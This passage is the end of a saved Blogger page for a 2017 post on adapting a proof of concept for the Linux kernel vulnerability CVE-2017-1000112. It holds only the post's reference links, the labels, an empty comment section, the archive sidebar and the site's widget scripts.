<li><a href="https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/">https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/</a></li>
<li><a href="http://seclists.org/oss-sec/2017/q3/277">http://seclists.org/oss-sec/2017/q3/277</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000112">https://nvd.nist.gov/vuln/detail/CVE-2017-1000112&nbsp;</a></li>
<li><a href="https://www.securityfocus.com/bid/100262/info">https://www.securityfocus.com/bid/100262/info</a></li>
<li><a href="https://packetstormsecurity.com/files/cve/CVE-2017-1000112">https://packetstormsecurity.com/files/cve/CVE-2017-1000112</a>&nbsp; </li>
</ul>
<br>
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1">
<span class="post-author vcard">
Posted by
<span class="fn" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person">
<meta content="https://www.blogger.com/profile/02751492065989267766" itemprop="url">
<a class="g-profile" href="https://www.blogger.com/profile/02751492065989267766" rel="author" title="author profile" data-gapiscan="true" data-onload="true" data-gapiattached="true">
<span itemprop="name">Rick</span>
</a>
</span>
</span>
<span class="post-timestamp">
at
<meta content="https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html" itemprop="url">
<a class="timestamp-link" href="https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html" rel="bookmark" title="permanent link"><abbr class="published" itemprop="datePublished" title="2017-12-21T11:38:00-08:00">11:38 AM</abbr></a>
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-44088605">
<a href="https://www.blogger.com/post-edit.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" height="18" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/icon18_edit_allbkg.gif" width="18">
</a>
</span>
</span>
<div class="post-share-buttons goog-inline-block">
<a class="goog-inline-block share-button sb-email" href="https://www.blogger.com/share-post.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;target=email" target="_blank" title="Email This"><span class="share-button-link-text">Email This</span></a><a class="goog-inline-block share-button sb-blog" href="https://www.blogger.com/share-post.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;target=blog" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=270,width=475&quot;); return false;" target="_blank" title="BlogThis!"><span class="share-button-link-text">BlogThis!</span></a><a class="goog-inline-block share-button sb-twitter" href="https://www.blogger.com/share-post.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;target=twitter" target="_blank" title="Share to Twitter"><span class="share-button-link-text">Share to Twitter</span></a><a class="goog-inline-block share-button sb-facebook" href="https://www.blogger.com/share-post.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;target=facebook" onclick="window.open(this.href, &quot;_blank&quot;, &quot;height=430,width=640&quot;); return false;" target="_blank" title="Share to Facebook"><span class="share-button-link-text">Share to Facebook</span></a><a class="goog-inline-block share-button sb-pinterest" href="https://www.blogger.com/share-post.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;target=pinterest" target="_blank" title="Share to Pinterest"><span class="share-button-link-text">Share to Pinterest</span></a>
</div>
</div>
<div class="post-footer-line post-footer-line-2">
<span class="post-labels">
Labels:
<a href="https://ricklarabee.blogspot.com/search/label/cve-2017-1000112" rel="tag">cve-2017-1000112</a>,
<a href="https://ricklarabee.blogspot.com/search/label/linux%20kernel" rel="tag">linux kernel</a>,
<a href="https://ricklarabee.blogspot.com/search/label/local%20privilege%20escalation" rel="tag">local privilege escalation</a>,
<a href="https://ricklarabee.blogspot.com/search/label/ubuntu" rel="tag">ubuntu</a>
</span>
</div>
<div class="post-footer-line post-footer-line-3">
<span class="post-location">
</span>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>No comments:</h4>
<div id="Blog1_comments-block-wrapper">
<dl class="avatar-comment-indent" id="comments-block">
</dl>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<h4 id="comment-post-message">Post a Comment</h4>
<p>
</p>
<a href="https://www.blogger.com/comment-iframe.g?blogID=755044011870705123&amp;postID=3659093573996653033&amp;blogspotRpcToken=398439" id="comment-editor-src"></a>
<iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="195px" id="comment-editor" name="comment-editor" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/comment-iframe.html" width="100%" data-resized="true"></iframe>
<script src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/3261120736-comment_from_post_iframe.js.下載" type="text/javascript"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
</div>
</div>

        </div></div>
      
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-newer-link">
<a class="blog-pager-newer-link" href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html" id="Blog1_blog-pager-newer-link" title="Newer Post">Newer Post</a>
</span>
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="https://ricklarabee.blogspot.com/2017/01/virtual-memory-page-tables-and-one-bit.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
<a class="home-link" href="https://ricklarabee.blogspot.com/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="https://ricklarabee.blogspot.com/feeds/3659093573996653033/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
<div class="sidebar section" id="sidebar-right-1"><div class="widget HTML" data-version="1" id="HTML1">
<h2 class="title">twitter.com/rlarabee</h2>
<div class="widget-content">
<a href="https://twitter.com/rlarabee">Follow @rlarabee</a>
</div>
<div class="clear"></div>
</div></div>
<table border="0" cellpadding="0" cellspacing="0" class="section-columns columns-2">
<tbody>
<tr>
<td class="first columns-cell">
<div class="sidebar section" id="sidebar-right-2-1"><div class="widget BlogArchive" data-version="1" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2018/">
2018
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2018/07/">
July
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2017/">
2017
</a>
<span class="post-count" dir="ltr">(2)</span>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">

        ▼&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2017/12/">
December
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="posts">
<li><a href="https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html">Adapting the POC for CVE-2017-1000112 to Other Ker...</a></li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2017/01/">
January
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2016/">
2016
</a>
<span class="post-count" dir="ltr">(2)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2016/03/">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">

        ►&nbsp;
      
</span>
</a>
<a class="post-count-link" href="https://ricklarabee.blogspot.com/2016/02/">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class="clear"></div>
</div>
</div></div>
</td>
<td class="columns-cell">
<div class="sidebar section" id="sidebar-right-2-2"><div class="widget Profile" data-version="1" id="Profile1">
<h2>About Me</h2>
<div class="widget-content">
<dl class="profile-datablock">
<dt class="profile-data">
<a class="profile-name-link g-profile" href="https://www.blogger.com/profile/02751492065989267766" rel="author" style="background-image: url(//www.blogger.com/img/logo-16.png);" data-gapiscan="true" data-onload="true" data-gapiattached="true">
Rick
</a>
</dt>
</dl>
<a class="profile-link" href="https://www.blogger.com/profile/02751492065989267766" rel="author">View my complete profile</a>
<div class="clear"></div>
</div>
</div></div>
</td>
</tr>
</tbody>
</table>
<div class="sidebar no-items section" id="sidebar-right-3"></div>
</aside>
</div>
</div>
</div>
<div style="clear: both"></div>
<!-- columns -->
</div>
<!-- main -->
</div>
</div>
<div class="main-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<footer>
<div class="footer-outer">
<div class="footer-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left footer-fauxborder-left">
<div class="fauxborder-right footer-fauxborder-right"></div>
<div class="region-inner footer-inner">
<div class="foot no-items section" id="footer-1"></div>
<table border="0" cellpadding="0" cellspacing="0" class="section-columns columns-2">
<tbody>
<tr>
<td class="first columns-cell">
<div class="foot no-items section" id="footer-2-1"></div>
</td>
<td class="columns-cell">
<div class="foot no-items section" id="footer-2-2"></div>
</td>
</tr>
</tbody>
</table>
<!-- outside of the include in order to lock Attribution widget -->
<div class="foot section" id="footer-3" name="Footer"><div class="widget Attribution" data-version="1" id="Attribution1">
<div class="widget-content" style="text-align: center;">
Simple theme. Powered by <a href="https://www.blogger.com/" target="_blank">Blogger</a>.
</div>
<div class="clear"></div>
</div></div>
</div>
</div>
<div class="footer-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</footer>
<!-- content -->
</div>
</div>
<div class="content-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<script type="text/javascript">
    window.setTimeout(function() {
        document.body.className = document.body.className.replace('loading', '');
      }, 10);
  </script>
<script src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/plusone.js.下載" type="text/javascript" gapi_processed="true"></script>

<script type="text/javascript" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/3630122430-widgets.js.下載"></script>
<script type="text/javascript">
window['__wavt'] = 'AOuZoY61fVP8v_SjHYx3zRgnhkPUYa1lKw:1638468232894';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d755044011870705123','//ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html','755044011870705123');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '755044011870705123', 'title': 'Never-Ending Security', 'url': 'https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html', 'canonicalUrl': 'https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html', 'homepageUrl': 'https://ricklarabee.blogspot.com/', 'searchUrl': 'https://ricklarabee.blogspot.com/search', 'canonicalHomepageUrl': 'https://ricklarabee.blogspot.com/', 'blogspotFaviconUrl': 'https://ricklarabee.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en', 'localeUnderscoreDelimited': 'en', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Never-Ending Security - Atom\x22 href\x3d\x22https://ricklarabee.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Never-Ending Security - RSS\x22 href\x3d\x22https://ricklarabee.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Never-Ending Security - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/755044011870705123/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Never-Ending Security - Atom\x22 href\x3d\x22https://ricklarabee.blogspot.com/feeds/3659093573996653033/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1155466832-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/3f6f2296c2541ccc', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'Share to Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '3659093573996653033', 'postImageThumbnailUrl': 'https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/s72-c/kernel_structure.png', 'postImageUrl': 'https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/s640/kernel_structure.png', 'pageName': 'Adapting the POC for CVE-2017-1000112 to Other Kernels', 'pageTitle': 'Never-Ending Security: Adapting the POC for CVE-2017-1000112 to Other Kernels'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard!', 'ok': 'Ok', 'postLink': 'Post Link'}}, {'name': 'template', 'data': {'name': 'Simple', 'localizedName': 'Simple', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': false, 'variant': 'bold', 'variantId': 'bold'}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Adapting the POC for CVE-2017-1000112 to Other Kernels', 'description': 'This post will show how to adapt Andrey\x27s @andreyknvl  proof of concent, https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-10001...', 'featuredImage': 'https://2.bp.blogspot.com/-2aCux-DohaA/WjwAvi7gwmI/AAAAAAAAAUA/0AaiUwys0IYmrprJd2ugtecAMACd1qP7gCEwYBhgL/s640/kernel_structure.png', 'url': 'https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': false, 'isPost': true, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'postId': 3659093573996653033}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'crosscol', document.getElementById('PageList1'), {'title': 'Pages', 'links': [{'isCurrentPage': false, 'href': 'https://ricklarabee.blogspot.com/', 'title': 'Home'}, {'isCurrentPage': false, 'href': 'https://ricklarabee.blogspot.com/p/blog-page.html', 'id': '644942066946242876', 'title': 'Training Resources'}], 'mobile': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/2908359363-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/4076883957-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebar-right-1', document.getElementById('HTML1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-2-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-2-2', document.getElementById('Profile1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>

<link type="text/css" rel="stylesheet" href="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/4076883957-lightbox_bundle.css"><script type="text/javascript" src="./2017 - Adapting the POC for CVE-2017-1000112 to Other Kernels_files/2908359363-lbx.js.下載"></script></body></html>